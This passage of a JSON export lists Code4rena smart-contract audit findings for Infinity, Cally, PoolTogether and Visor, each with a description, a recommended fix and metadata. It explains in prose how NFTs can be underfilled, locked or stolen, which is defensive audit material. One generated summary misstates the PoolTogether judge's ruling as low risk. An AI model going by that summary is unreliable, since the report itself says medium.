commented](https://github.com/code-423n4/2022-06-infinity-findings/issues/43#issuecomment-1179595297):**\n > When an NFT supports both 721 & 1155 interfaces, the code prefers `_transferERC721s` - however this ignores the order's `numTokens`. This may result in under filling NFTs for an order, at the same cost to the buyer. The warden's recommendation would address this concern. Or maybe `_transferERC721s` could require `numTokens == 1`, but that approach would be limiting for this scenario. Since the buyer gets a fraction of what they paid for and it impacts a top20 1155, this seems to be a High risk issue.\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a vulnerability in the InfinityExchange smart contract, which could lead to users paying for more tokens than they receive. The bug affects tokens that support both ERC721 and ERC1155 standards, such as the asset token of The Sandbox Game. The vulnerability is caused by the code in the InfinityExchange contract, which first checks ERC721 interface supports and then ERC1155, leading to only one item being transferred instead of the expected two. The bug can be fixed by reordering the checks, so the ERC1155 check is first. This would ensure that the expected number of tokens is transferred.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-06-infinity-nft-marketplace-contest",
      "sponsor_name": "Infinity NFT Marketplace",
      "sponsor_link": "https://twitter.com/infinitydotxyz",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2022-06-infinity",
      "github_link": "https://github.com/code-423n4/2022-06-infinity-findings/issues/43",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "136",
      "slug": "h-06-some-real-world-nft-tokens-may-support-both-erc721-and-erc1155-standards-which-may-break-infinityexchange_transfernfts-code4rena-infinity-nft-marketplace-infinity-nft-marketplace-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Infinity NFT Marketplace",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Infinity NFT Marketplace",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Payments"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "NFT Marketplace"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Gaming"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "supportsInterface"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "2298",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 22,
      "protocol_id": "224",
      "title": "[M-09] Use safeTransferFrom instead of transferFrom for ERC721 transfers",
      "content": "_Submitted by hickuphh3, also found by antonttc, berndartmueller, catchup, cccz, dipp, FSchmoede, GimelSec, hake, jah, jayjonah8, joestakey, kebabsec, Kenshin, Kumpa, MiloTruck, minhquanym, peritoflores, rfa, shenwilly, WatchPug, and ynnad_\n\n<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L199>\n\n<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L295>\n\n<https://github.com/code-423n4/2022-05-cally/blob/1849f9ee12434038aa80753266ce6a2f2b082c59/contracts/src/Cally.sol#L344>\n\n### Details & Impact\n\nThe `transferFrom()` method is used instead of `safeTransferFrom()`, presumably to save gas. I however argue that this isnâ€™t recommended because:\n\n*   [OpenZeppelinâ€™s documentation](https://docs.openzeppelin.com/contracts/4.x/api/token/erc721#IERC721-transferFrom-address-address-uint256-) discourages the use of `transferFrom()`, use `safeTransferFrom()` whenever possible\n*   Given that any NFT can be used for the call option, there are a few NFTs (hereâ€™s an [example](https://github.com/sz-piotr/eth-card-game/blob/master/src/ethereum/contracts/ERC721Market.sol#L20-L31)) that have logic in the `onERC721Received()` function, which is only triggered in the `safeTransferFrom()` function and not in `transferFrom()`\n\n### Recommended Mitigation Steps\n\nCall the `safeTransferFrom()` method instead of `transferFrom()` for NFT transfers. Note that the `CallyNft` contract should inherit the `ERC721TokenReceiver` contract as a consequence.\n\n```solidity\nabstract contract CallyNft is ERC721(\"Cally\", \"CALL\"), ERC721TokenReceiver {...}\n```\n\n**[outdoteth (Cally) confirmed and resolved](https://github.com/code-423n4/2022-05-cally-findings/issues/38#issuecomment-1128776476):**\n > the fix for this issue is here; https://github.com/outdoteth/cally/pull/4\n\n\n\n***\n\n",
      "summary": "\nThis bug report is about the use of `transferFrom()` instead of `safeTransferFrom()` in the Cally.sol contract. The `transferFrom()` method is used to save gas, however this is not recommended because OpenZeppelinâ€™s documentation discourages its use and some NFTs have logic in the `onERC721Received()` function which is only triggered in the `safeTransferFrom()` function and not in `transferFrom()`. To mitigate this issue, it is recommended to call the `safeTransferFrom()` method instead of `transferFrom()` for NFT transfers. The `CallyNft` contract should also inherit the `ERC721TokenReceiver` contract.",
      "report_date": {},
      "contest_prize_txt": "$50,000 USDC",
      "contest_link": "https://code4rena.com/contests/2022-05-cally-contest",
      "sponsor_name": "Cally",
      "sponsor_link": "https://twitter.com/callyfinance",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2022-05-cally",
      "github_link": "https://github.com/code-423n4/2022-05-cally-findings/issues/38",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "122",
      "slug": "m-09-use-safetransferfrom-instead-of-transferfrom-for-erc721-transfers-code4rena-cally-cally-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Cally",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Cally",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Synthetics"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Liquidity manager"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Options Vault"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "transferFrom vs safeTransferFrom"
          }
        },
        {
          "tags_tag": {
            "title": "ERC721"
          }
        }
      ]
    },
    {
      "id": "25482",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "MEDIUM",
      "finders_count": 0,
      "protocol_id": "471",
      "title": "[M-07] Using `transferFrom` on ERC721 tokens",
      "content": "_Submitted by shw_\n\nIn the function `awardExternalERC721` of contract `PrizePool`, when awarding external ERC721 tokens to the winners, the `transferFrom` keyword is used instead of `safeTransferFrom`. If any winner is a contract and is not aware of incoming ERC721 tokens, the sent tokens could be locked.\n\nRecommend consider changing `transferFrom` to `safeTransferFrom` at line 602. However, it could introduce a DoS attack vector if any winner maliciously rejects the received ERC721 tokens to make the others unable to get their awards. Possible mitigations are to use a `try/catch` statement to handle error cases separately or provide a function for the pool owner to remove malicious winners manually if this happens.\n\n**[asselstine (PoolTogether) confirmed and disagreed with severity](https://github.com/code-423n4/2021-06-pooltogether-findings/issues/115#issuecomment-868021913):**\n > This issue poses no risk to the Prize Pool, so it's more of a `1 (Low Risk` IMO.\n>\n> This is just about triggering a callback on the ERC721 recipient.  We omitted it originally because we didn't want a revert on the callback to DoS the prize pool.\n>\n> However, to respect the interface it makes sense to implement it fully.  That being said, if it does throw we must ignore it to prevent DoS attacks.\n\n**[dmvt (judge) commented](https://github.com/code-423n4/2021-06-pooltogether-findings/issues/115#issuecomment-907507608):**\n > I agree with the medium risk rating provided by the warden.\n\n",
      "summary": "\nA bug has been identified in the function `awardExternalERC721` of contract `PrizePool`. Currently, the `transferFrom` keyword is used instead of `safeTransferFrom` when awarding external ERC721 tokens to the winners. This could cause problems if a winner is a contract and is not aware of incoming ERC721 tokens, as the sent tokens could be locked. It is recommended to change `transferFrom` to `safeTransferFrom` at line 602. However, this could introduce a DoS attack vector if any winner maliciously rejects the received ERC721 tokens to make the others unable to get their awards. Possible solutions to this are to use a `try/catch` statement to handle error cases separately or provide a function for the pool owner to remove malicious winners manually if this happens. The severity of this bug was initially debated by shw, asselstine (PoolTogether) and dmvt (judge). Asselstine and dmvt agreed that it poses a low risk to the Prize Pool, and should be implemented to respect the interface.",
      "report_date": {},
      "contest_prize_txt": "$60,000 USDC",
      "contest_link": "https://code4rena.com/reports/2021-06-pooltogether",
      "sponsor_name": "PoolTogether",
      "sponsor_link": "",
      "quality_score": 1,
      "general_score": 1,
      "source_link": "https://code4rena.com/reports/2021-06-pooltogether",
      "github_link": "https://github.com/code-423n4/2021-06-pooltogether-findings/issues/115",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "14",
      "slug": "m-07-using-transferfrom-on-erc721-tokens-code4rena-pooltogether-pooltogether-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "PoolTogether",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "PoolTogether",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Liquid Staking"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "transferFrom vs safeTransferFrom"
          }
        },
        {
          "tags_tag": {
            "title": "SafeTransfer"
          }
        }
      ]
    },
    {
      "id": "191",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 3,
      "protocol_id": "427",
      "title": "[H-03] Approval for NFT transfers is not removed after transfer",
      "content": "_Submitted by cmichel, also found by gpersoon, and pauliax_\n\nThe `Visor.transferERC721` does not reset the approval for the NFT.\n\nAn approved delegatee can move the NFT out of the contract once.\nIt could be moved to a market and bought by someone else who then deposits it again to the same vault.\nThe first delegatee can steal the NFT and move it out of the contract a second time.\n\nRecommend resetting the approval on transfer.\n\n**[xyz-ctrl (Visor) confirmed](https://github.com/code-423n4/2021-05-visorfinance-findings/issues/48#issuecomment-856953219):**\n> We will be mitigating this issue for our next release and before these experimental features are introduced in platform.\n> PR pending\n\n**[ztcrypto (Visor) commented](https://github.com/code-423n4/2021-05-visorfinance-findings/issues/48#issuecomment-889192312):**\n> duplicate of above ones and fixed\n\n",
      "summary": "\nThis bug report is about a vulnerability in the `Visor.transferERC721` function. This vulnerability could allow an approved delegatee to steal a Non-Fungible Token (NFT) from the contract. The delegatee can move the NFT out of the contract once, and then someone else could buy it from a market and deposit it back to the same vault. The delegatee can then steal the NFT again and move it out of the contract a second time. \n\nTo mitigate this vulnerability, it is recommended to reset the approval on transfer.",
      "report_date": {},
      "contest_prize_txt": "$60,000 USDC",
      "contest_link": "https://code4rena.com/contests/2021-05-visor-contest",
      "sponsor_name": "Visor",
      "sponsor_link": "https://twitter.com/VisorFinance",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "https://code4rena.com/reports/2021-05-visorfinance",
      "github_link": "https://github.com/code-423n4/2021-05-visorfinance-findings/issues/48",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "10",
      "slug": "h-03-approval-for-nft-transfers-is-not-removed-after-transfer-code4rena-visor-visor-contest-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Visor",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Visor",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "CDP"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Yield"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "ERC721"
          }
        },
        {
          "tags_tag": {
            "title": "Approve"
          }
        }
      ]
    }
  ]
}